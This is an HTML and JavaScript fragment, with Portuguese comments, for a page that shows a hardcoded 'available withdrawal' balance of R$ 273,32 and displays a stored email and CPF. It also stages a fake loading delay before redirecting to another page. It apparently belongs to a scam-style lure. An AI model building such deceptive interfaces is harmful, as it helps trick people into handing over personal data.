    <div id="infoModal" class="modal-saque">
        <div class="modal-content-saque">
            <span class="close-saque" id="closeModal">&times;</span>
            <h2>Valor do Saque Disponível</h2>
            <p>R$ 273,32</p>
        </div>
    </div>
    <script>
        function showModal() {
            const modal = document.getElementById('infoModal');
            modal.style.display = 'block'; // Exibe o modal

            // Fecha o modal após 5 segundos
            setTimeout(() => {
                hideModal();
            }, 5000);
        }

        // Função para esconder o modal
        function hideModal() {
            const modal = document.getElementById('infoModal');
            modal.style.display = 'none'; // Esconde o modal
        }

        // Adiciona evento de clique para fechar o modal
        document.getElementById('closeModal').onclick = hideModal;

        // Exibe o modal ao carregar a página
        window.onload = function() {
            loadUserData(); // Carrega dados do localStorage
            showModal(); // Mostra o modal
        };
        // Função para obter e exibir dados do localStorage
        function loadUserData() {
            const email = localStorage.getItem('email');
            const cpf = localStorage.getItem('cpf');

            if (email) {
                document.getElementById('emailDisplay').textContent = email;
            }

            if (cpf) {
                document.getElementById('cpfDisplay').textContent = cpf;
            }
        }

        function showModalLoading() {
        const modal = document.getElementById('modal');
        modal.style.display = 'flex'; // Exibe o modal
    }

    // Função para esconder o modal
    function hideModalLoading() {
        const modal = document.getElementById('modal');
        modal.style.display = 'none'; // Esconde o modal
        window.location.href = 'buzeira.html';
    }

    // Adiciona eventos de clique aos botões
    document.querySelectorAll('.card .bodyCard a button').forEach(button => {
        button.addEventListener('click', (e) => {
            e.preventDefault(); // Impede o link de ser seguido
            showModalLoading(); // Mostra o modal
            setTimeout(hideModalLoading, 2000); // Esconde o modal após 2 segundos (ou ajuste conforme necessário)
        });
    });
    </script>
